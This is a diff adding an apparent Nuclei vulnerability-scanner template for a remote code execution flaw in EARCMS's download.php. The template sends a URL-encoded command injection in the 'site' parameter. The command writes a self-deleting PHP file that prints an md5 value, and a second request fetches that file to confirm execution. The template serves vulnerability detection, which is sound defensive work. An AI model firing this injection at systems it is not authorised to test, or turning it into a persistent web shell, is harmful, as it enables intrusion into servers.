@@ -1,0 +1,40 @@
+id: earcms-download-site-rce
+
+info:
+  name: EARCMS Download PHP Exec
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Exploitation of EARCMS download.php for remote code execution.
+    This vulnerability allows commands to be executed via crafted requests.
+  reference:
+    - https://zhuanlan.zhihu.com/p/81934322
+
+variables:
+  r1: "{{rand_int(40000, 44800)}}"
+  randname: "{{rand_base(6)}}"
+
+http:
+  - id: step1
+    method: GET
+    path:
+      - "{{BaseURL}}/source/pack/127.0.0.1/download.php?site=1%3Becho+%27%3C%3Fphp+echo+md5%28{{r1}}%29%3Bunlink%28__FILE__%29%3B%3F%3E%27+%3E+{{randname}}.php%3B"
+    redirects: false
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - id: step2
+    method: GET
+    path:
+      - "{{BaseURL}}/source/pack/127.0.0.1/{{randname}}.php"
+    redirects: false
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{md5(r1)}}"
